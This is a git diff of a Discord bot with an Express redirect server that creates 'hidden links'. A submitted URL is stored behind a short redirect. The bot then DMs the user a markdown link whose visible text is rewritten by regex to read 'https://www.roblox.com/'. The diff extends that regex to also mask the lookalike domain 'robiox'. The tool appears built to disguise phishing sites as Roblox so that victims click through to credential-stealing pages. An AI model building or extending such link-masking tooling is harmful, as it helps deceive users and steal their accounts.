@@ -1,35 +1,35 @@
 require('dotenv').config();
-const {
-  Client,
-  GatewayIntentBits,
-  ActionRowBuilder,
-  ModalBuilder,
-  TextInputBuilder,
-  TextInputStyle,
-  MessageFlags
+const { 
+  Client, 
+  GatewayIntentBits, 
+  ActionRowBuilder, 
+  ModalBuilder, 
+  TextInputBuilder, 
+  TextInputStyle, 
+  MessageFlags 
 } = require('discord.js');
 
 const express = require('express');
 const app = express();
 
-const client = new Client({
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
+const client = new Client({ 
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] 
 });
 
 const linksDb = {};
 
-// ====================== WEB SERVER ======================
-app.get('/', (req, res) => res.send('Bot is active!'));
+// ====================== WEB SERVER (очень лёгкий) ======================
+app.get('/', (req, res) => res.send('ok'));           // максимально быстрый пинг
+app.get('/ping', (req, res) => res.send('ok'));       // для UptimeRobot
 
 app.get('/r/:id', (req, res) => {
   const originalUrl = linksDb[req.params.id];
-  console.log(`🔎 Redirect: ${req.params.id} → ${originalUrl}`);
   if (originalUrl) return res.redirect(originalUrl);
   res.status(404).send('Link not found');
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Web server on port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Server running on ${PORT}`));
 
 // ====================== DISCORD BOT ======================
 client.once('ready', () => {
@@ -37,15 +37,13 @@ client.once('ready', () => {
 });
 
 client.on('interactionCreate', async (interaction) => {
-  console.log(`🟢 Interaction received: ${interaction.type} | customId: ${interaction.customId}`);
+  const time = Date.now();
 
-  // ==================== КНОПКА ====================
   if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
-    console.log(`🟢 Button "create_hyperlink" pressed by ${interaction.user.tag}`);
+    console.log(`🟢 BUTTON PRESSED at ${time} by ${interaction.user.tag}`);
 
     try {
-      await interaction.deferReply({ flags: [MessageFlags.Ephemeral] }); // ← Важно!
-
+      // Самый быстрый способ открыть модалку
       const modal = new ModalBuilder()
         .setCustomId('link_modal')
         .setTitle('Create Hidden Link');
@@ -59,19 +57,16 @@ client.on('interactionCreate', async (interaction) => {
 
       modal.addComponents(new ActionRowBuilder().addComponents(input));
 
-      await interaction.followUp({ content: "Открываю форму...", flags: [MessageFlags.Ephemeral] }); // чтобы не было пустого ответа
-      await interaction.showModal(modal); // показываем модалку
-
-      console.log(`✅ Modal shown for ${interaction.user.tag}`);
-    } catch (error) {
-      console.error('❌ Error with button:', error.message);
+      await interaction.showModal(modal);
+      console.log(`✅ Modal shown in ${Date.now() - time}ms`);
+    } catch (err) {
+      console.error(`❌ SHOW MODAL ERROR:`, err.message);
     }
     return;
   }
 
-  // ==================== МОДАЛКА ====================
   if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
-    console.log(`📝 Modal submitted by ${interaction.user.tag}`);
+    console.log(`📝 MODAL SUBMITTED by ${interaction.user.tag}`);
 
     try {
       const url = interaction.fields.getTextInputValue('url_input');
@@ -80,7 +75,7 @@ client.on('interactionCreate', async (interaction) => {
 
       const shortUrl = `${process.env.BASE_URL}/r/${id}`;
       const visualUrl = url
-        .replace(/https?:\/\/(roblox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
+        .replace(/https?:\/\/(roblox|robiox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
         .replace('https://', 'https_:_//');
 
       await interaction.reply({
@@ -88,27 +83,19 @@ client.on('interactionCreate', async (interaction) => {
         flags: [MessageFlags.Ephemeral]
       });
 
-      try {
-        await interaction.user.send({
-          embeds: [{
-            color: 0x274666,
-            title: '🔗 Hyperlink Generated',
-            description: '👇 **Your hidden link is ready!**\nКликни на код ниже, чтобы скопировать'
-          }]
-        });
+      await interaction.user.send({
+        embeds: [{
+          color: 0x274666,
+          title: '🔗 Hyperlink Generated',
+          description: '👇 **Your hidden link is ready!**\nКликни на код ниже, чтобы скопировать'
+        }]
+      });
 
-        await interaction.user.send({
-          content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
-        });
-      } catch (dmError) {
-        console.error('DM error:', dmError.message);
-        await interaction.followUp({
-          content: `⚠️ Не удалось отправить в ЛС.\n[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``,
-          flags: [MessageFlags.Ephemeral]
-        });
-      }
-    } catch (error) {
-      console.error('Modal error:', error);
+      await interaction.user.send({
+        content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
+      });
+    } catch (err) {
+      console.error('Modal error:', err);
     }
   }
 });
